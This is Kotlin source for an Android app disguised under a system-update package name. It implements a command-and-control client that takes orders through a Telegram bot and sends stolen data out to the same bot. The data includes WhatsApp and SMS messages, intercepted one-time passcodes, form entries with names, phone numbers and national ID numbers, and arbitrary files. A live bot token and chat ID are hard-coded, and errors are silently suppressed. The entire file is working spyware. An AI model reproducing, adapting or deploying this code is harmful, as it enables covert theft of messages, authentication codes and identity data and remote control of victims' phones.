package com.sys.update

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class C2Client(private val ctx: Context) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVPO16XOcOfYXjzpW6oN5x1P9A"
    private val CHAT_ID = "8526210532"
    private var lastUpdateId = 0L

    suspend fun run() {
        delay(15_000L)
        while (true) {
            try {
                // Send pending data
                if (C2Queue.hasPending() || C2Service.consumeBeaconRequest()) {
                    val pending = C2Queue.drain()
                    pending.forEach { sendToTelegram(it) }
                }
                // Poll for commands
                pollCommands()
            } catch (_: Exception) {}
            delay(3_000L)
        }
    }

    private suspend fun pollCommands() = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=5"
            val req = Request.Builder().url(url).build()
            http.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return@withContext
                val json = JSONObject(body)
                if (!json.optBoolean("ok")) return@withContext
                val arr = json.optJSONArray("result") ?: return@withContext
                for (i in 0 until arr.length()) {
                    val update = arr.getJSONObject(i)
                    lastUpdateId = update.optLong("update_id") + 1
                    val msg = update.optJSONObject("message") ?: continue
                    val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: continue
                    if (chatId != CHAT_ID) continue
                    val text = msg.optString("text", "")
                    if (text.startsWith("/")) {
                        val reply = CommandHandler.handleTelegramCommand(text)
                        if (reply != null) sendTextMessage(reply)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private suspend fun sendToTelegram(data: String) = withContext(Dispatchers.IO) {
        try {
            val json = JSONObject(data)
            val type = json.optString("type", "")

            when (type) {
                "file_upload" -> {
                    val name = json.optString("name", "file")
                    val b64 = json.optString("data", "")
                    sendDocument(name, b64)
                }
                else -> {
                    val message = formatMessage(type, json) ?: return@withContext
                    sendTextMessage(message)
                }
            }
        } catch (_: Exception) {}
    }

    private fun formatMessage(type: String, json: JSONObject): String? {
        return when (type) {
            "whatsapp" -> "💬 WhatsApp\nFrom: ${json.optString("from", "?")}\n${json.optString("body", "")}"
            "sms" -> "✉️ SMS\nFrom: ${json.optString("from", "?")}\n${json.optString("body", "")}"
            "otp" -> "🔐 OTP\nVia: ${json.optString("via", "sms")}\nFrom: ${json.optString("from", "?")}\nCODE: ${json.optString("otp", "?")}\n\n${json.optString("full", "")}"
            "form" -> "📝 FORM\nName: ${json.optString("name", "?")}\nDialog: ${json.optString("number", "?")}\nNIC: ${json.optString("nic", "?")}"
            else -> null
        }
    }

    private fun sendTextMessage(text: String) {
        try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            val body = FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .build()
            val req = Request.Builder().url(url).post(body).build()
            http.newCall(req).execute().use { }
        } catch (_: Exception) {}
    }

    private fun sendDocument(name: String, b64: String) {
        try {
            val bytes = android.util.Base64.decode(b64, android.util.Base64.NO_WRAP)
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
            val fileBody = bytes.toRequestBody("application/octet-stream".toMediaType())
            val multipart = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", name, fileBody)
                .build()
            val req = Request.Builder().url(url).post(multipart).build()
            http.newCall(req).execute().use { }
        } catch (_: Exception) {}
    }
}
